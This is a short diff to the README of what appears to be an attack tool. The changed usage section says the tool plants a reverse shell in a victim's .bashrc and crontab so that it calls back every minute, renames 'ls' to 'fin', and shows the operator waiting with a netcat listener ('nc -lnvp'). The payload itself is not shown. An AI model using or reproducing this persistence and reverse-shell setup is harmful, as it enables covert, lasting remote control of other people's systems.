@@ -58,6 +58,11 @@ Options:
 
 ```
 # USAGE
+if you want to use ls you need to put fin :
+```bash
+[root@SecDet vex]# fin
+Desktop   Documents   Downloads   Music   Pictures   Public   Templates   vex   Videos
+```
 waiting to receive your revshell cuz i put your revshell in the .bashrc and in crontab so after 1 min you will receive it
 ```bash
 [vex👽>  ]$ nc -lnvp "your port"
